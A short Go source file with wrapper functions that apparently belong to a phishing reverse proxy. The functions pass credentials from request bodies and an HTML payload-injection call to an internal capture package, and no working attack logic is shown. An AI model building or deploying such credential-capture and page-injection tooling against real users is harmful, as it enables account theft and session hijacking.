package main

import (
	"net/http"

	capturepkg "ms-proxy/internal/capture"
)

func captureCredentials(source, body, contentType string, target *Target, session *Session) {
	if target == nil {
		return
	}

	capturepkg.Credentials(source, body, contentType, target.Name)
	_ = session
}

func captureHandler(w http.ResponseWriter, r *http.Request) {
	capturepkg.Handler(w, r)
}

func injectPayload(html string) string {
	return capturepkg.InjectPayload(html)
}
